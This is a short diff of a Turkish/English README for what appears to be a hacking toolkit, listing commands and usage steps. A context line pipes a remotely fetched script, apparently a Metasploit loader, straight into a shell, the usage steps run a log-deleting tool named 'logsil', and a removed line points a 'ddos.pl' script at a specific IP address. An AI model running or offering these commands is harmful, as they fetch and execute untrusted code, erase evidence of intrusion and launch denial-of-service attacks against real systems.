@@ -20,7 +20,7 @@ Komutlar | Commands
 3-> curl https://monodram.net/shell/msfyukle.sh | sh
 ~~~---~~~
 Kullanım | Using
-1-> chmod +x 
+1-> chmod +x ./logsil
     ./logsil
-2-> ddos.pl -dns 88.227.11.33
+2-> ddos.pl -help
 3-> ./msfyukle.sh
